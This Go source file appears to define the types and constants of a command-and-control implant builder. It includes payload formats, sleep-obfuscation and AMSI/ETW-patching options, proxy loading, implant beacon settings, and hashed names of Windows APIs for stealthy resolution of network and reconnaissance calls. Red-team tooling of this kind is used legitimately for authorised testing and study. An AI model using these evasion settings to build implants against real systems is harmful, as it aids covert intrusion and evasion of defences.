package Types

const (
	PayloadDir  = "Payloads"
	PayloadName = "Agent"
)

const (
	FILETYPE_WINDOWS_EXE            = 1
	FILETYPE_WINDOWS_SERVICE_EXE    = 2
	FILETYPE_WINDOWS_DLL            = 3
	FILETYPE_WINDOWS_REFLECTIVE_DLL = 4
	FILETYPE_WINDOWS_RAW_BINARY     = 5
)

const (
	SLEEPOBF_NO_OBF  = 0
	SLEEPOBF_EKKO    = 1
	SLEEPOBF_ZILEAN  = 2
	SLEEPOBF_FOLIAGE = 3
)

const (
	SLEEPOBF_BYPASS_NONE   = 0
	SLEEPOBF_BYPASS_JMPRAX = 1
	SLEEPOBF_BYPASS_JMPRBX = 2
)

const (
	PROXYLOADING_NONE             = 0
	PROXYLOADING_RTLREGISTERWAIT  = 1
	PROXYLOADING_RTLCREATETIMER   = 2
	PROXYLOADING_RTLQUEUEWORKITEM = 3
)

const (
	AMSIETW_PATCH_NONE   = 0
	AMSIETW_PATCH_HWBP   = 1
	AMSIETW_PATCH_MEMORY = 2
)

const (
	ARCHITECTURE_X64 = 1
	ARCHITECTURE_X86 = 2
)

type BuilderConfig struct {
	Compiler64 string
	Compiler86 string
	Nasm       string
	DebugDev   bool
	SendLogs   bool
}
type ImplantConfig struct {
	Arch                 int            `json:"Arch"`
	Name                 string         `json:"Name"`
	KillDate             int64          `json:"KillDate"`
	WorkingHours         string         `json:"WorkingHours"`
	HostRotation         string         `json:"HostRotation"`
	ListenerConfig       ListenerConfig `json:"ListenerConfig"`
	InjectionType        string         `json:"InjectionType"`
	MemoryEncryptionType string         `json:"MemoryEncryptionType"`
	Format               string         `json:"Format"`
	Sleep                int            `json:"Sleep"`
	Jitter               int            `json:"Jitter"`
}

type AgentBuilder struct {
	BuildSource bool
	SourcePath  string
	RSAKeyPath  string
	Silent      bool

	Payloads []string

	FilesCreated []string

	CompileDir     string
	FileExtenstion string

	FileType int
	ClientId string

	PatchBinary bool

	ProfileConfig struct {
		Original any

		MagicMzX64 string
		MagicMzX86 string

		ImageSizeX64 int
		ImageSizeX86 int

		ReplaceStringsX64 map[string]string
		ReplaceStringsX86 map[string]string
	}

	ImplantConfig ImplantConfig

	ImplantOptions struct {
		Config []byte
	}

	CompilerOptions struct {
		Config BuilderConfig

		SourceDirs  []string
		IncludeDirs []string
		CFlags      []string
		Defines     []string

		Main struct {
			Agent string
			Dll   string
			Exe   string
			Svc   string
		}
	}

	OutputPath string
}

// had to switch this from map to slice because go does not iterate over the keys in an order it does it randomly.
// we need predictablility to parse these in the pe file.
var DllNameHashes = []uint64{
	0xAF6973267322CEF1, //KERNEL32.DLL
	0xD99176CD993A6E6C, //ntdll.dll
}

var ApiNameHashes = []uint64{
	0x27C27F0E9D246F42, //WinHttpOpen
	0xEB0E11CDF0F8755D, //WinHttpConnect
	0x271EFDAEEC211456, //WinHttpOpenRequest
	0x371EFDAEEC1C1D40, //WinHttpSendRequest
	0xB34C34E468B2D450, //WinHttpSetOption
	0x61B35AE1647C5613, //WinHttpAddRequestHeaders
	0x5849BC331DE4F77,  //WinHttpReceiveResponse
	0xBC2634B9D6ABC69B, //WinHttpQueryHeaders
	0xBBCD1381F969714B, //WinHttpReadData
	0xE91AC4AB50E39E3E, //WinHttpCloseHandle
	0x934CBF2CB5BA65FE, //RtlGetVersion
	0xE7BF643E93800065, //NtClose
	0x96366A0AA4E7804E, //NtOpenProcessToken
	0x1F25DB6092C0F340, //NtOpenThreadToken
	0x30650DA980EEDACA, //NtQueryInformationToken
	0x75A514F31871F04A, //RtlAllocateHeap
	0x75A4A0B9D2C3F04A, //RtlReAllocateHeap
	0xD3B77E4DD8696D61, //RtlRandomEx
	0x7416C5FD78F4D55E, //NtGetTickCount
	0x5FC99BF0197A7133, //GetAdaptersInfo
	0x61EF0CEE5979D62B, //GetUserNameA
	0xC89E0CCD2E1EF42B, //GetComputerNameExA
	0xDFB3641D9871EFFB, //LocalAlloc
	0x9E13641CB4B6622B, //LocalReAlloc
	0xCBCA36CC38F7CC65, //LocalFree
	0xB22B0F2C5A666505, //LoadLibraryA
	0x2B3DEF2C9071F059, //GetProcAddress
	0x71DEA6CC38F7CD4F, //GetLocalTime
	0x1261F2B90D585BD0, //GetSystemTimeAsFileTime
	0x9774D5E616F6E65D, //GetSystemMetrics
}
